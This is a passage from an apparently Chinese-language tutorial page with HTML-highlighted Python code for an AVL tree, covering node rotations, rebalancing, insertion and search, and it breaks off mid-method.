&lt;h2 id="代码实现">代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">typing&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Optional&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">AVLTreeNode&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;树节点
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">parent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;AVLTreeNode&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">value&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parent&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Optional&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;AVLTreeNode&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Optional&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;AVLTreeNode&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">height&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;子树高度
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Returns:
&lt;/span>&lt;span class="s2"> int: 子树高度
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_left_height&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_right_height&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">_left_height&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">_right_height&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">balance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;是否平衡
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Returns:
&lt;/span>&lt;span class="s2"> bool: 是否平衡
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">abs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_left_height&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_right_height&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">right_rotate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;节点右旋
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">Exception&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;can not rotate tree with empty left node&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># 旧的根成为右节点&lt;/span>
&lt;span class="c1"># 旧的根的左节点成为新的根&lt;/span>
&lt;span class="c1"># 新的根的右节点变成旧的根的左节点&lt;/span>
&lt;span class="c1"># 旧的根变成新的根的右节点&lt;/span>
&lt;span class="n">old_root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>
&lt;span class="n">new_root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>
&lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>
&lt;span class="c1"># 新根替换旧根&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">left_rotate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;节点左旋
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">Exception&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;can not rotate tree with empty right node&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># 旧的根成为左节点&lt;/span>
&lt;span class="c1"># 旧的根的右节点成为新的根&lt;/span>
&lt;span class="c1"># 新的根的左节点作为旧的根的右子树&lt;/span>
&lt;span class="c1"># 旧的根变成新的根的左子树&lt;/span>
&lt;span class="n">old_root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>
&lt;span class="n">new_root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>
&lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>
&lt;span class="c1"># 新根替换旧根&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_root&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">old_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">old_root&lt;/span>
&lt;span class="k">assert&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>
&lt;span class="k">assert&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">new_root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">_rebalance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">balance&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_left_height&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_right_height&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># 如果最高的子树是左子树的右子树，先对左子树左旋&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> \
&lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> \
&lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left_rotate&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right_rotate&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># 如果最高的子树是右子树的左子树，先对右子树右旋&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> \
&lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> \
&lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right_rotate&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left_rotate&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;插入新节点
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Args:
&lt;/span>&lt;span class="s2"> value (int): 要插入的数据
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AVLTreeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AVLTreeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_rebalance&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;搜索值
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Args:
&lt;/span>&lt;span class="s2"> value (int): 待搜索的值
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Returns:
&lt;/span>&lt;span class="s2"> bool: 值是否存在
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">left&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">right&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">AVLTree&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;AVL tree
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Optional&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">AVLTreeNode&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">height&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;AVL树高度
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Returns:
&lt;/span>&lt;span class="s2"> int: 树高度
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">height&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nd">@property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">balance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;树是否平衡
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Returns:
&lt;/span>&lt;span class="s2"> bool: 树是否平衡
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">balance&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;insert new value
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Args:
&lt;/span>&lt;span class="s2"> value (int): new value
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AVLTreeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
